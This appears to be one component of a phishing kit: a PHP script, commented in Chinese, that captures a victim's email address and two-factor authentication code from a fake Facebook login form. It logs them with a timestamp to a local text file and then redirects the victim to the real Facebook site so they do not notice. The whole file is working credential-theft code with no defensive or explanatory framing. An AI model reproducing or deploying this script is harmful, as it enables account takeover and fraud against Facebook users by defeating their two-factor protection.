# 文件名: 2fa_capture.php (处理2FA码)
<?php
// 第二次捕获2FA验证码
$code = $_POST['2fa_code'] ?? '';
$email = $_POST['email'] ?? '';
$time = date('Y-m-d H:i:s');

if (!empty($code) && !empty($email)) {
    file_put_contents('2fa_logs.txt', "[$time] Email: $email | 2FA: $code\n", FILE_APPEND | LOCK_EX);
}

// 重定向至真实Facebook
header('Location: https://www.facebook.com/');
exit;
?>